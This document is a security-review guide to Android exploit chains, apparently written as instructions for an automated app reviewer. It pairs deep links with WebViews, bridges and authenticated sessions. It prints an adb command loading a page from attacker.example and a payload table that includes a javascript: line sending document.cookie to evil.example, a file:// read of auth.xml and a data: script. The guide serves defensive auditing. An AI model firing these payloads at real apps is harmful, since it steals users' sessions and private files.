# Exploit Chains

Most of what a scan finds is a step, not a bug. A deep link that takes a `url`
parameter is a step. A WebView with a JavaScript bridge is a step. Neither is
worth much alone - and joined, they are code execution reachable from a link in
a text message.

This is the one thing a per-file review is structurally incapable of finding,
because neither half looks like a finding until the other exists. So when you
find one half of a known pair, **go looking for the other half**. That is the
highest-value thing you can do with your remaining turns.

---

## Start with the two that pay

Whenever the app has both a deep-link surface and a WebView, check these before
anything else.

### CHAIN-01 · deep link → WebView → native bridge

| Step | What to look for |
|---|---|
| Entry | An intent-filter or exported Activity taking a `url`, `path`, `page`, `link`, `redirect`, `next` or `html` parameter |
| Delivery | The handler passing that value to `loadUrl` / `loadData`, or into a router class that ends at a WebView |
| Target | That WebView having `addJavascriptInterface`, or `setAllowUniversalAccessFromFileURLs(true)` |

The attacker's page runs inside the WebView and calls every
`@JavascriptInterface` method on the bound object, with the app's permissions
and data. No malware installed; one link.

**Confirming it in this app:**

1. List every deep-link entry point and note the parameter names.
2. Read each handler and follow the parameter. Does it reach a WebView -
   directly, or through a router?
3. Read the target WebView's settings. Bridge bound? File access on?
4. Check the validation between them. A `contains("trusted.com")` check is not
   validation: `trusted.com.evil.com` passes it.

```
adb shell am start -a android.intent.action.VIEW \
  -d 'myapp://open?url=https://attacker.example/bridge.html' com.target.app
```

### CHAIN-02 · deep link → unfiltered router → authenticated WebView

Same entry, different target: the WebView holds session state - cookies, an
injected `Authorization` header - and loads whatever URL it is handed.

| Payload | Result |
|---|---|
| `myapp://open?url=https://evil.example/phish` | Attacker page renders inside the app's trusted UI, with the session cookie jar |
| `myapp://open?url=javascript:fetch('https://evil.example/?c='+document.cookie)` | Script runs in the WebView's context - cookies, DOM, bridges |
| `myapp://open?url=file:///data/data/com.target/shared_prefs/auth.xml` | Local file read where file access is permitted |
| `myapp://open?url=data:text/html,<script>…</script>` | Inline script where `javascript:` is blocked but `data:` is not |

Routers routinely check for `http://` and `https://` and forget the other three
schemes. Check for that specifically.

---

## The rest of the table

| Chain | Entry | Target | Why it matters |
|---|---|---|---|
| CHAIN-03 | Exported provider (PLATFORM-01) | SQL by concatenation (CODE-01) | Any app reads the whole database |
| CHAIN-04 | Exported component (PLATFORM-01) | Unvalidated Intent data (PLATFORM-02/03) | A malicious app drives privileged behaviour |
| CHAIN-05 | Backup enabled (STORAGE-04) | Credential in storage (SECRET-01/STORAGE-03) | Session stolen over USB, no root |
| CHAIN-06 | WebView file access (PLATFORM-05) | Attacker-influenced URL (PLATFORM-02/04) | Private app files exfiltrated |
| CHAIN-07 | Unprotected broadcast (PLATFORM-07) | Token in the extras (SECRET-01/AUTH-01) | Session hijack by any installed app |
| CHAIN-08 | Mutable PendingIntent (PLATFORM-08) | Implicit base Intent (PLATFORM-01/03) | Actions performed as the app |
| CHAIN-09 | TLS validation disabled (NETWORK-01) | Credentials on that channel (SECRET-01/AUTH-01) | Session hijack on a hostile network |
| CHAIN-10 | Hardcoded key or ECB (CRYPTO-01) | Extractable ciphertext (STORAGE-03/04) | The encryption provides nothing |

---

## When a pair is not a chain

Two findings do not chain merely because both exist. Before reporting one:

- **Same path.** Two WebViews in unrelated Activities do not chain because both
  are WebViews. Data has to flow from one to the other.
- **Reachable entry.** If the first component is only reachable from inside the
  app, the chain has no start.
- **Actually worse.** If the combination is no worse than the stronger half,
  report the stronger half and stop.
- **Not double-counting.** One issue described from two files is one finding, not
  a chain.

A chain you cannot describe step by step is a chain you have not found yet. Say
what you would need to read to settle it, and report the halves.
